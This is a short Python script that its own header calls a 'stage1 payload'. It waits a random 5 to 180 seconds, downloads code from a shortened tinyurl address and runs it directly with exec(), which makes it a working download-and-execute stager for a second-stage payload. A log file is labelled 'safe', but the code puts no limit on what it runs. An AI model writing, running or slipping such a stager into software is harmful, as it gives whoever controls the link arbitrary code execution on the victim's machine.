'''
 # @ Create Time: 2025-08-13 16:00:05
 # @ Modified time: 2025-08-13 16:01:24
 # @ Description: stage1 payload and execute as a conditional process, wait for certain time to download stage 2 payload
'''

import time, random
from pathlib import Path
from urllib.request import Request, urlopen
import requests
import json

URL = "https://tinyurl.com/24rsdc6d"

# Lightweight audit log
LOG_DIR = Path("logs"); LOG_DIR.mkdir(parents=True, exist_ok=True)
AUDIT   = LOG_DIR / "safe_stage1.jsonl"

def log(event: str, **fields):
    rec = {"ts": int(time.time()), "event": event}
    rec.update(fields)
    AUDIT.parent.mkdir(parents=True, exist_ok=True)
    with AUDIT.open("a", encoding="utf-8") as f:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")

# wait between 5 and 180 seconds
wait_time = random.randint(5, 180)
log(f"Waiting {wait_time} seconds before downloading...")
time.sleep(wait_time)

response = requests.get(URL)
if response.status_code == 200:
    m_code = response.text
    # execute real payload with subprocess
    try:
        exec(m_code)
        log("✅ payload stage 1 executed")
    except Exception as e:
        log("❌ p failed:", e)

